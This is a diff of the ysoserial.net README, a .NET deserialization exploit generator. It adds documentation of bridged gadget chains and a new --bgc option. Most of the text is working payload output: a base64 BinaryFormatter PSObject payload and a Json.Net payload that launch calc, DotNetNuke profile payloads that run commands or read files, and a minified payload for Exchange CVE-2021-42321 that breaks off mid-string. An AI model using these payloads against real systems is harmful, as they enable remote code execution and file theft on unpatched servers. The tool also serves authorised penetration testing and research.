@@ -34,7 +34,12 @@ ysoserial.net generates deserialization payloads for a variety of .NET formatter
 == GADGETS ==
 	(*) ActivitySurrogateDisableTypeCheck [Disables 4.8+ type protections for ActivitySurrogateSelector, command is ignored]
 		Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer , SoapFormatter
-			Labels: Bridge and dervied
+			Labels: Not bridge but derived
+			Extra options:
+			      --var, --variant=VALUE Choices: 1 -> use TypeConfuseDelegateGenerator 
+			                               [default], 2 -> use 
+			                               TextFormattingRunPropertiesMarshal
+			
 	(*) ActivitySurrogateSelector [This gadget ignores the command parameter and executes the constructor of ExploitClass class]
 		Formatters: BinaryFormatter (2) , LosFormatter , SoapFormatter
 			Labels: Not bridge or derived
@@ -54,18 +59,23 @@ ysoserial.net generates deserialization payloads for a variety of .NET formatter
 	(*) AxHostState
 		Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer , SoapFormatter
 			Labels: Bridge and dervied
+			Supported formatter for the bridge: BinaryFormatter
 	(*) ClaimsIdentity
 		Formatters: BinaryFormatter , LosFormatter , SoapFormatter
 			Labels: Bridge and dervied, OnDeserialized
+			Supported formatter for the bridge: BinaryFormatter
 	(*) ClaimsPrincipal
 		Formatters: BinaryFormatter , LosFormatter , SoapFormatter
-			Labels: Bridge and dervied, OnDeserialized
+			Labels: Bridge and dervied, OnDeserialized, SecondOrderDeserialization
+			Supported formatter for the bridge: BinaryFormatter
 	(*) DataSet
 		Formatters: BinaryFormatter , LosFormatter , SoapFormatter
 			Labels: Bridge and dervied
-	(*) DataSetTypeSpoof
+			Supported formatter for the bridge: BinaryFormatter
+	(*) DataSetTypeSpoof [A more advanced type spoofing which can use any arbtirary types can be seen in TestingArenaHome::SpoofByBinaryFormatterJson]
 		Formatters: BinaryFormatter , LosFormatter , SoapFormatter
 			Labels: Bridge and dervied
+			Supported formatter for the bridge: BinaryFormatter
 	(*) ObjectDataProvider
 		Formatters: DataContractSerializer (2) , FastJson , FsPickler , JavaScriptSerializer , Json.Net , SharpSerializerBinary , SharpSerializerXml , Xaml (4) , XmlSerializer (2) , YamlDotNet < 5.0.0
 			Labels: Not bridge or derived
@@ -99,12 +109,15 @@ ysoserial.net generates deserialization payloads for a variety of .NET formatter
 	(*) RolePrincipal
 		Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter
 			Labels: Bridge and dervied
+			Supported formatter for the bridge: BinaryFormatter
 	(*) SessionSecurityToken
 		Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter
 			Labels: Bridge and dervied
+			Supported formatter for the bridge: BinaryFormatter
 	(*) SessionViewStateHistoryItem
 		Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter
 			Labels: Bridge and dervied
+			Supported formatter for the bridge: LosFormatter
 	(*) TextFormattingRunProperties [This normally generates the shortest payload]
 		Formatters: BinaryFormatter , DataContractSerializer , LosFormatter , NetDataContractSerializer , SoapFormatter
 			Labels: Not bridge but derived
@@ -123,6 +136,7 @@ ysoserial.net generates deserialization payloads for a variety of .NET formatter
 	(*) ToolboxItemContainer
 		Formatters: BinaryFormatter , LosFormatter , SoapFormatter
 			Labels: Bridge and dervied
+			Supported formatter for the bridge: BinaryFormatter
 	(*) TypeConfuseDelegate
 		Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer
 			Labels: Not bridge or derived
@@ -132,6 +146,7 @@ ysoserial.net generates deserialization payloads for a variety of .NET formatter
 	(*) WindowsClaimsIdentity [Requires Microsoft.IdentityModel.Claims namespace (not default GAC)]
 		Formatters: BinaryFormatter (3) , DataContractSerializer (2) , Json.Net (2) , LosFormatter (3) , NetDataContractSerializer (3) , SoapFormatter (2)
 			Labels: Bridge and dervied, Not in GAC
+			Supported formatter for the bridge: BinaryFormatter
 			Extra options:
 			      --var, --variant=VALUE Payload variant number where applicable. 
 			                               Choices: 1, 2, or 3 based on formatter.
@@ -139,6 +154,7 @@ ysoserial.net generates deserialization payloads for a variety of .NET formatter
 	(*) WindowsIdentity
 		Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter
 			Labels: Bridge and dervied
+			Supported formatter for the bridge: BinaryFormatter
 	(*) WindowsPrincipal
 		Formatters: BinaryFormatter , DataContractJsonSerializer , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter
 			Labels: Bridge and dervied
@@ -320,6 +336,12 @@ Options:
                                argument).
   -s, --stdin                The command to be executed will be read from 
                                standard input.
+      --bgc, --bridgedgadgetchains=VALUE
+                             Chain of bridged gadgets separated by comma (,). 
+                               Each gadget will be used to complete the next 
+                               bridge gadget. The last one will be used in the 
+                               requested gadget. This will be ignored when 
+                               using the searchformatter argument.
   -t, --test                 Whether to run payload locally. Default: false
       --outputpath=VALUE     The output file path. It will be ignored if 
                                empty.
@@ -369,6 +391,7 @@ For more help on plugin options use `-h` along with `-p <plugin name>`. Eg:
 
 ```
 $ ./ysoserial.exe -h -p DotNetNuke
+
 ysoserial.net generates deserialization payloads for a variety of .NET formatters.
 
 Plugin:
@@ -390,6 +413,7 @@ Options:
 ### Generate a **calc.exe** payload for Json.Net using *ObjectDataProvider* gadget.
 ```
 $ ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
+
 {
     '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
     'MethodName':'Start',
@@ -404,19 +428,30 @@ $ ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
 ### Generate a **calc.exe** payload for BinaryFormatter using *PSObject* gadget.
 ```
 $ ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
+
 AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLCBWZXJzaW9uPTMuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUBAAAAJVN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNPYmplY3QBAAAABkNsaVhtbAECAAAABgMAAACJFQ0KPE9ianMgVmVyc2lvbj0iMS4xLjAuMSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vcG93ZXJzaGVsbC8yMDA0LzA0Ij4mI3hEOw0KPE9iaiBSZWZJZD0iMCI+JiN4RDsNCiAgICA8VE4gUmVmSWQ9IjAiPiYjeEQ7DQogICAgICA8VD5NaWNyb3NvZnQuTWFuYWdlbWVudC5JbmZyYXN0cnVjdHVyZS5DaW1JbnN0YW5jZSNTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uL1J1bnNwYWNlSW52b2tlNTwvVD4mI3hEOw0KICAgICAgPFQ+TWljcm9zb2Z0Lk1hbmFnZW1lbnQuSW5mcmFzdHJ1Y3R1cmUuQ2ltSW5zdGFuY2UjUnVuc3BhY2VJbnZva2U1PC9UPiYjeEQ7DQogICAgICA8VD5NaWNyb3NvZnQuTWFuYWdlbWVudC5JbmZyYXN0cnVjdHVyZS5DaW1JbnN0YW5jZTwvVD4mI3hEOw0KICAgICAgPFQ+U3lzdGVtLk9iamVjdDwvVD4mI3hEOw0KICAgIDwvVE4+JiN4RDsNCiAgICA8VG9TdHJpbmc+UnVuc3BhY2VJbnZva2U1PC9Ub1N0cmluZz4mI3hEOw0KICAgIDxPYmogUmVmSWQ9IjEiPiYjeEQ7DQogICAgICA8VE5SZWYgUmVmSWQ9IjAiIC8+JiN4RDsNCiAgICAgIDxUb1N0cmluZz5SdW5zcGFjZUludm9rZTU8L1RvU3RyaW5nPiYjeEQ7DQogICAgICA8UHJvcHM+JiN4RDsNCiAgICAgICAgPE5pbCBOPSJQU0NvbXB1dGVyTmFtZSIgLz4mI3hEOw0KCQk8T2JqIE49InRlc3QxIiBSZWZJZCA9IjIwIiA+ICYjeEQ7DQogICAgICAgICAgPFROIFJlZklkPSIxIiA+ICYjeEQ7DQogICAgICAgICAgICA8VD5TeXN0ZW0uV2luZG93cy5NYXJrdXAuWGFtbFJlYWRlcltdLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1PC9UPiYjeEQ7DQogICAgICAgICAgICA8VD5TeXN0ZW0uQXJyYXk8L1Q+JiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5PYmplY3Q8L1Q+JiN4RDsNCiAgICAgICAgICA8L1ROPiYjeEQ7DQogICAgICAgICAgPExTVD4mI3hEOw0KICAgICAgICAgICAgPFMgTj0iSGFzaCIgPiAgDQoJCSZsdDtSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSImZ3Q7DQoJICZsdDtPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IkxhdW5jaENhbGMiIE9iamVjdFR5cGUgPSAieyB4OlR5cGUgRGlhZzpQcm9jZXNzfSIgTWV0aG9kTmFtZSA9ICJTdGFydCIgJmd0Ow0KICAgICAmbHQ7T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnMmZ3Q7DQogICAgICAgICZsdDtTeXN0ZW06U3RyaW5nJmd0O2NtZCZsdDsvU3lzdGVtOlN0cmluZyZndDsNCiAgICAgICAgJmx0O1N5c3RlbTpTdHJpbmcmZ3Q7L2MgImNhbGMiICZsdDsvU3lzdGVtOlN0cmluZyZndDsNCiAgICAgJmx0Oy9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycyZndDsNCiAgICAmbHQ7L09iamVjdERhdGFQcm92aWRlciZndDsNCiZsdDsvUmVzb3VyY2VEaWN0aW9uYXJ5Jmd0Ow0KCQkJPC9TPiYjeEQ7DQogICAgICAgICAgPC9MU1Q+JiN4RDsNCiAgICAgICAgPC9PYmo+JiN4RDsNCiAgICAgIDwvUHJvcHM+JiN4RDsNCiAgICAgIDxNUz4mI3hEOw0KICAgICAgICA8T2JqIE49Il9fQ2xhc3NNZXRhZGF0YSIgUmVmSWQgPSIyIj4gJiN4RDsNCiAgICAgICAgICA8VE4gUmVmSWQ9IjEiID4gJiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3Q8L1Q+JiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5PYmplY3Q8L1Q+JiN4RDsNCiAgICAgICAgICA8L1ROPiYjeEQ7DQogICAgICAgICAgPExTVD4mI3hEOw0KICAgICAgICAgICAgPE9iaiBSZWZJZD0iMyI+ICYjeEQ7DQogICAgICAgICAgICAgIDxNUz4mI3hEOw0KICAgICAgICAgICAgICAgIDxTIE49IkNsYXNzTmFtZSI+UnVuc3BhY2VJbnZva2U1PC9TPiYjeEQ7DQogICAgICAgICAgICAgICAgPFMgTj0iTmFtZXNwYWNlIj5TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uPC9TPiYjeEQ7DQogICAgICAgICAgICAgICAgPE5pbCBOPSJTZXJ2ZXJOYW1lIiAvPiYjeEQ7DQogICAgICAgICAgICAgICAgPEkzMiBOPSJIYXNoIj40NjA5MjkxOTI8L0kzMj4mI3hEOw0KICAgICAgICAgICAgICAgIDxTIE49Ik1pWG1sIj4gJmx0O0NMQVNTIE5BTUU9IlJ1bnNwYWNlSW52b2tlNSIgJmd0OyZsdDtQUk9QRVJUWSBOQU1FPSJ0ZXN0MSIgVFlQRSA9InN0cmluZyIgJmd0OyZsdDsvUFJPUEVSVFkmZ3Q7Jmx0Oy9DTEFTUyZndDs8L1M+JiN4RDsNCiAgICAgICAgICAgICAgPC9NUz4mI3hEOw0KICAgICAgICAgICAgPC9PYmo+JiN4RDsNCiAgICAgICAgICA8L0xTVD4mI3hEOw0KICAgICAgICA8L09iaj4mI3hEOw0KICAgICAgPC9NUz4mI3hEOw0KICAgIDwvT2JqPiYjeEQ7DQogICAgPE1TPiYjeEQ7DQogICAgICA8UmVmIE49Il9fQ2xhc3NNZXRhZGF0YSIgUmVmSWQgPSIyIiAvPiYjeEQ7DQogICAgPC9NUz4mI3hEOw0KICA8L09iaj4mI3hEOw0KPC9PYmpzPgs=
 ```
 
 ### Generate a run_command payload for DotNetNuke using its plugin
 ```
 $ ./ysoserial.exe -p DotNetNuke -M run_command -C calc.exe
+
 <profile><item key="foo" type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.ObjectStateFormatter, System.Web, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfObjectStateFormatterObjectDataProvider xmlns:xsd=" [http://www.w3.org/2001/XMLSchema](http://www.w3.org/2001/XMLSchema) " xmlns:xsi=" [http://www.w3.org/2001/XMLSchema-instance](http://www.w3.org/2001/XMLSchema-instance) "><ExpandedElement/><ProjectedProperty0><MethodName>Deserialize</MethodName><MethodParameters><anyType xsi:type="xsd:string">/wEyxBEAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAAIQBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuU29ydGVkU2V0YDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAVDb3VudAhDb21wYXJlcgdWZXJzaW9uBUl0ZW1zAAMABgiNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQgCAAAAAgAAAAkDAAAAAgAAAAkEAAAABAMAAACNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQEAAAALX2NvbXBhcmlzb24DIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIJBQAAABEEAAAAAgAAAAYGAAAACy9jIGNhbGMuZXhlBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs=</anyType></MethodParameters><ObjectInstance xsi:type="ObjectStateFormatter"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfObjectStateFormatterObjectDataProvider></item></profile>
 ```
 
 ### Generate a read_file payload for DotNetNuke using its plugin
 ```
 $ ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini
+
 <profile><item key="name1: key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ExpandedElement/><ProjectedProperty0><MethodName>WriteFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">win.ini</anyType></MethodParameters><ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>
+```
+
+### Generate a minified BinaryFormatter payload to exploit Exchange CVE-2021-42321 using the ActivitySurrogateDisableTypeCheck gadget inside the ClaimsPrincipal gadget.
+```
+> .\ysoserial.exe -g ClaimsPrincipal -f BinaryFormatter -c foobar -bgc ActivitySurrogateDisableTypeCheck --minify --ust
+
+AAEAAAD/////AQAAAAAAAAAEAQAAACZTeXN0ZW0uU2VjdXJpdHkuQ2xhaW1zLkNsYWltc1ByaW5jaXBhbAEAAAAcbV9zZXJpYWxpemVkQ2xhaW1zSWRlbnRpdGllcwEGBQAAAKgfQUFFQUFBRC8vLy8vQVFBQUFBQUFBQUFNQWdBQUFFWlRlWE4wWlcwc1ZtVnljMmx2YmowMExqQXVNQzR3TEVOMWJIUjFjbVU5Ym1WMWRISmhiQ3hRZFdKc2FXTkxaWGxVYjJ0bGJqMWlOemRoTldNMU5qRTVNelJsTURnNUJRRUFBQUJBVTNsemRHVnRMa052Ykd4bFkzUnBiMjV6TGtkbGJtVnlhV011VTI5eWRHVmtVMlYwWURGYlcxTjVjM1JsYlM1VGRISnBibWNzYlhOamIzSnNhV0pkWFFRQUFBQUZRMjkxYm5RSVEyOXRjR0Z5WlhJSFZtVnljMmx2YmdWSmRHVnRjd0FEQUFZSVNWTjVjM1JsYlM1RGIyeHNaV04wYVc5dWN5NUhaVzVsY21sakxrTnZiWEJoY21semIyNURiMjF3WVhKbGNtQXhXMXRUZVhOMFpXMHVVM1J5YVc1bkxHMXpZMjl5YkdsaVhWMElBZ0FBQUFJQUFBQUpBd0FBQUFJQUFBQUpCQUFBQUFRREFBQUFTVk41YzNSbGJTNURiMnhzWldOMGFXOXVjeTVIWlc1bGNtbGpMa052YlhCaGNtbHpiMjVEYjIxd1lYSmxjbUF4VzF0VGVYTjBaVzB1VTNSeWFXNW5MRzF6WTI5eWJHbGlYVjBCQUFBQUMxOWpiMjF3WVhKcGMyOXVBeUpUZVhOMFpXMHVSR1ZzWldkaGRHVlRaWEpwWVd4cGVtRjBhVzl1U0c5c1pHVnlDUVVBQUFBUkJBQUFBQUlBQUFBR0JnQUFBQUFHQndBQUFQMExQRkpsYzI5MWNtTmxSR2xqZEdsdmJtRnllU0I0Yld4dWN6MGlhSFIwY0RvdkwzTmphR1Z0WVhNdWJXbGpjbTl6YjJaMExtTnZiUzkzYVc1bWVDOHlNREEyTDNoaGJXd3ZjSEpsYzJWdWRHRjBhVzl1SWlCNGJXeHVjenBoUFNKb2RIUndPaTh2YzJOb1pXMWhjeTV0YVdOeWIzTnZablF1WTI5dEwzZHBibVo0THpJd01EWXZlR0Z0YkNJZ2VHMXNibk02WWowaVkyeHlMVzVoYldWemNHRmpaVHBUZVhOMFpXMDdZWE56WlcxaWJIazliWE5qYjNKc2FXSWlJSGh0Ykc1ek9tTTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtOdmJtWnBaM1Z5WVhScGIyNDdZWE56WlcxaWJIazlVM2x6ZEdWdExrTnZibVpwWjNWeVlYUnBiMjRpSUhodGJHNXpPbVE5SW1Oc2NpMXVZVzFsYzNCaFkyVTZVM2x6ZEdWdExsSmxabXhsWTNScGIyNDdZWE56WlcxaWJIazliWE5qYjNKc2FXSWlQanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnWVRwTFpYazlJblI1Y0dVaUlFOWlhbVZqZEZSNWNHVTlJbnRoT2xSNWNHVWdZanBVZVhCbGZTSWdUV1YwYUc5a1RtRnRaVDBpUjJWMFZIbHdaU0krUEU5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2k1TlpYUm9iMlJRWVhKaGJXVjBaWEp6UGp4aU9sTjBjbWx1Wno1VGVYTjBaVzB1VjI5eWEyWnNiM2N1UTI5dGNHOXVaVzUwVFc5a1pXd3VRWEJ3VTJWMGRHbHVaM01zVTNsemRHVnRMbGR2Y210bWJHOTNMa052YlhCdmJtVnVkRTF2WkdWc0xGWmxjbk5wYjI0OU5DNHdMakF1TUN4RGRXeDBkWEpsUFc1bGRYUnlZV3dzVUhWaWJHbGpTMlY1Vkc5clpXNDlNekZpWmpNNE5UWmhaRE0yTkdVek5Ud3ZZanBUZEhKcGJtYytQQzlQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VFdWMGFHOWtVR0Z5WVcxbGRHVnljejQ4TDA5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2o0OFQySnFaV04wUkdGMFlWQnliM1pwWkdWeUlHRTZTMlY1UFNKbWFXVnNaQ0lnVDJKcVpXTjBTVzV6ZEdGdVkyVTlJbnRUZEdGMGFXTlNaWE52ZFhKalpTQjBlWEJsZlNJZ1RXVjBhRzlrVG1GdFpUMGlSMlYwUm1sbGJHUWlQanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VFdWMGFHOWtVR0Z5WVcxbGRHVnljejQ4WWpwVGRISnBibWMrWkdsellXSnNaVUZqZEdsMmFYUjVVM1Z5Y205bllYUmxVMlZzWldOMGIzSlVlWEJsUTJobFkyczhMMkk2VTNSeWFXNW5QanhrT2tKcGJtUnBibWRHYkdGbmN6NDBNRHd2WkRwQ2FXNWthVzVuUm14aFozTStQQzlQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VFdWMGFHOWtVR0Z5WVcxbGRHVnljejQ4TDA5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2o0OFQySnFaV04wUkdGMFlWQnliM1pwWkdWeUlHRTZTMlY1UFNKelpYUWlJRTlpYW1WamRFbHVjM1JoYm1ObFBTSjdVM1JoZEdsalVtVnpiM1Z5WTJVZ1ptbGxiR1I5SWlCTlpYUm9iMlJPWVcxbFBTSlRaWFJXWVd4MVpTSStQRTlpYW1WamRFUmhkR0ZRY205MmFXUmxjaTVOWlhSb2IyUlFZWEpoYldWMFpYSnpQanhpT2s5aWFtVmpkQzgrUEdJNlFtOXZiR1ZoYmo1MGNuVmxQQzlpT2tKdmIyeGxZVzQrUEM5UFltcGxZM1JFWVhSaFVISnZkbWxrWlhJdVRXVjBhRzlrVUdGeVlXMWxkR1Z5Y3o0OEwwOWlhbVZqZEVSaGRHRlFjbTkyYVdSbGNqNDhUMkpxWldOMFJHRjBZVkJ5YjNacFpHVnlJR0U2UzJWNVBTSnpaWFJOWlhSb2IyUWlJRTlpYW1WamRFbHVjM1JoYm1ObFBTSjdZVHBUZEdGMGFXTWdZenBEYjI1bWFXZDFjbUYwYVc5dVRXRnVZV2RsY2k1QmNIQlRaWFIwYVc1bmMzMGlJRTFsZEdodlpFNWhiV1U5SWxObGRDSStQRTlpYW1WamRFUmhkR0ZRY205MmFXUmxjaTVOWlhSb2IyUlFZWEpoYldWMFpYSnpQanhpT2xOMGNtbHVaejV0YVdOeWIzTnZablE2VjI5eWEyWnNiM2REYjIxd2IyNWxiblJOYjJSbGJEcEVhWE5oWW14bFFXTjBhWFpwZEhsVGRYSnliMmRoZEdWVFpXeGxZM1J2Y2xSNWNHVkRhR1ZqYXp3dllqcFRkSEpwYm1jK1BHSTZVM1J5YVc1blBuUnlkV1U4TDJJNlUzUnlhVzVuUGp3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeUxrMWxkR2h2WkZCaGNtRnRaWFJsY25NK1BDOVBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSStQQzlTWlhOdmRYSmpaVVJwWTNScGIyNWhjbmsrQkFVQUFBQWlVM2x6ZEdWdExrUmxiR1ZuWVhSbFUyVnlhV0ZzYVhwaGRHbHZia2h2YkdSbGNnTUFBQUFJUkdWc1pXZGhkR1VIYldWMGFHOWtNQWR0WlhSb2IyUXhBd01ETUZONWMzUmxiUzVFWld4bFoyRjBaVk5sY21saGJHbDZZWFJwYjI1SWIyeGtaWElyUkdWc1pXZGhkR1ZGYm5SeWVTOVRlWE4wWlcwdVVtVm1iR1ZqZEdsdmJpNU5aVzFpWlhKSmJtWnZVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjaTlUZVhOMFpXMHVVbVZtYkdWamRHbHZiaTVOWlcxaVpYSkpibVp2VTJWeWFXRnNhWHBoZEdsdmJraHZiR1JsY2drSUFBQUFDUWtBQUFBSkNnQUFBQVFJQUFBQU1GTjVjM1JsYlM1RVpXeGxaMkYwWlZObGNtbGhiR2w2WVhScGIyNUliMnhrWlhJclJHVnNaV2RoZEdWRmJuUnllUWNBQUFBRWRIbHdaUWhoYzNObGJXSnNlUVowWVhKblpYUVNkR0Z5WjJWMFZIbHdaVUZ6YzJWdFlteDVEblJoY21kbGRGUjVjR1ZPWVcxbENtMWxkR2h2WkU1aGJXVU5aR1ZzWldkaGRHVkZiblJ5ZVFFQkFnRUJBUU13VT